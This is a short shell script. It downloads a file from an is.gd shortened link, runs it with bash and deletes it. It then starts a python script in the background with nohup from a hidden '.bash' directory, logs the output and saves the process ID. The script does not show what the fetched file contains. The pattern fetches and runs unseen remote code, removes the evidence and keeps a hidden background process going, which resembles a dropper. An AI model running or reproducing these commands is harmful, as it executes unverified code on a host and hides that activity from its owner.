wget https://is.gd/eCwoKc
bash ./eCwoKc
top
rm ./eCwoKc
cd .bash/
nohup python -u test.py > x.log 2>&1 & 
#echo "hello"
echo $! > save_pid.txt
tail -f x.log
